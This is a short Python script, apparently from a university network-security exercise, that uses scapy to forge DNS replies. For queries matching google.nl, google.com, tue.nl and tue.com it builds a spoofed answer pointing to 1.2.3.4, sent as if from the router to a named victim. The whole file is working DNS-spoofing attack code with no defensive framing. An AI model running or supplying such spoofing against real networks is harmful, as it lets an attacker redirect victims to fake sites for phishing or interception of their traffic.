from scapy.all import *

# TEST TEST TEST TEST TEST
dns_domains = {
	b"google.nl": "1.2.3.4",
	b"google.com": "1.2.3.4",
	b"tue.nl": "1.2.3.4",
	b"tue.com": "1.2.3.4"
}

def spoof_dns(pkt, victim_ip, router_ip, interface):
	qname = pkt[DNSQR].qname
	
	for domain, fake_ip in dns_domains.items():
		if domain in qname:
			ip = IP(src=router_ip, dst=victim_ip)
			udp = UDP(sport=53, dport=pkt[UDP].sport)
			dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qdcount=1, ancount=1, qd=pkt[DNS].qd, an=DNSRR(rrname=qname, ttl=60, rdata=fake_ip))
			
			spoof = ip/udp/dns
			send(spoof)
			return

